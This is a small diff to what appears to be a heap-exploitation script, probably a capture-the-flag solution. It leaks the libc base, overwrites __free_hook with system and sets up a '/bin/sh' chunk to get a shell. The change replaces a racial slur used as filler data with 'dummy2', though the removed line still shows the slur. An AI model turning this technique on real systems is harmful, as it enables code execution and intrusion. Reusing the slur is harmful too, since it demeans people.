@@ -136,7 +136,7 @@ log.info(f'libc base: {hex(libc.address)}')
 system = libc.sym.system
 
 malloc(b"30", p64(__free_hook))
-malloc(b"30", b"nigga2")
+malloc(b"30", b"dummy2")
 malloc(b"30", p64(system))
 
 malloc(b"20", b"/bin/sh")
